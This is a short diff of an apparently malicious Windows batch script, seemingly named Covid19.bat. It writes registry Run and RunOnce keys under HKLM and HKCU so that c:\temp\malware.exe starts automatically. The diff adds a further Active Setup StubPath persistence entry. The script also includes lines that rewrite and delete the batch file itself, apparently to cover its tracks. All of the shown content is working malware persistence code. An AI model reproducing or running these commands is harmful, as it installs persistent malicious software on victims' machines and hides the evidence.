@@ -34,6 +34,7 @@ reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ 
 reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d c:\temp\malware.exe
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Malware /t REG_SZ /d c:\temp\malware.exe
+reg add HKLM\Software\Microsoft\Active Setup\Installed Components\{Malware} /v StubPath /t REG_SZ /d c:\temp\malware.exe
 
 ECHO del Covid19.bat > "C:\Users\User\Documents\NotCovid19.txt"
 copy "C:\Users\User\Documents\NotCovid19.txt" "C:\Users\User\Documents\Covid19.bat"
